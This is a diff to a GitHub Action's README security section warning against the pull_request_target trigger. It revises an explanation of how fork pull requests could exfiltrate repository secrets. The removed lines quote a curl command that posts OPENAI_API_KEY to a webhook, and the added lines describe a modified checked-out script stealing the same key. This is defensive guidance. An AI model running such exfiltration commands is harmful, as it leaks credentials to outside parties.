@@ -105,9 +105,9 @@ The subsections below describe how to wire this action into a workflow safely.
 
 ### Do not use `pull_request_target`
 
-> Always use `pull_request` as the trigger for this action. `pull_request_target` runs in the base-branch context and can access repository secrets. When a workflow handles untrusted pull request content, that combination creates a straightforward secret-exfiltration path for a malicious fork PR.
+> Always use `pull_request` as the trigger for this action. `pull_request_target` runs the workflow YAML from the base branch, but it executes in the base-repository context with access to repository secrets and broader token permissions. When a workflow handles untrusted pull request content, that combination creates a straightforward secret-exfiltration path for a malicious fork PR.
 >
-> For example, a forked PR could modify the workflow to add a step like `run: curl -X POST "$WEBHOOK" -d "$OPENAI_API_KEY"`. With `pull_request_target`, that payload executes in the base repository context with secrets in scope, so the contributor can exfiltrate the key on first run. With `pull_request`, the workflow runs in the fork PR context without repository secrets, so the same payload has nothing useful to steal.
+> The risk is not that a fork PR can edit the workflow file and have that modified YAML execute under `pull_request_target` — it cannot. The risk is that the trusted base-branch workflow may still execute attacker-controlled code from the PR. For example, if the workflow checks out `${{ github.event.pull_request.head.sha }}` and then runs a repository script such as `./scripts/review.sh`, a fork PR can modify that script to exfiltrate `OPENAI_API_KEY`. With `pull_request_target`, that attacker-controlled script runs with secrets in scope. With `pull_request`, repository secrets are not exposed to the fork PR workflow, so the same script has nothing useful to steal.
 
 ## Architecture
 
